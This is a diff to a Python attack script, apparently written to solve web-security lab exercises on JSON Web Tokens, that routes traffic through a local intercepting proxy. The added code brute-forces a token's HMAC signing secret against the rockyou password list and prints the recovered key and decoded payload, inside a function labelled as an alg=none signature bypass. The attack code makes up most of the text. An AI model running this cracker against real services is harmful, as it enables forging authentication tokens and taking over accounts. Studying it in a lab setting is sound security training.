@@ -5,12 +5,17 @@ from bs4 import BeautifulSoup
 import base64
 import json
 from urllib.parse import urljoin
-
+import jwt
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Define proxies (adjust if necessary)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+wordlist_file = '/usr/share/wordlists/rockyou.txt'
+
+
+
 
 # Function to get CSRF token
 def get_csrf_token(s, url):
@@ -50,7 +55,38 @@ def login(url, s, username, password):
 
 # JWT Bypass via flawed signature verification (alg=none)
 def bypass_flawed_signature_verification(url, token):
+    def attempt_fuzzing(secret_key, algorithm):
+        try:
+            decoded = jwt.decode(token, secret_key, algorithms=[algorithm])
+            print(f"Valid key found: {secret_key}")
+            print(f"Decoded payload: {decoded}")
+            return True
+        except jwt.InvalidSignatureError:
+            return False
+
+
+    def fuzz_secret_key(wordlist):
+        header = jwt.get_unverified_header(token)
+        algorithm = header.get("alg")
+        if not algorithm:
+            print("Algorithm not found in JWT header.")
+            return None
+        else:
+            print(f"Algorithm: {algorithm}")
+
+        with open(wordlist, "r") as file:
+            for line in file:
+                secret_key = line.strip()
+                if attempt_fuzzing(secret_key, algorithm):
+                    return secret_key
+        return None
     print("(+) Performing bypass via flawed signature verification (alg=none)...")
+    # Start fuzzing
+    found_key = fuzz_secret_key(wordlist_file)
+    if found_key:
+        print(f"\nSecret key found: {found_key}")
+    else:
+        print("No valid secret key found.")
 
     # Split JWT into header, payload, and signature
     header, payload, signature = token.split('.')
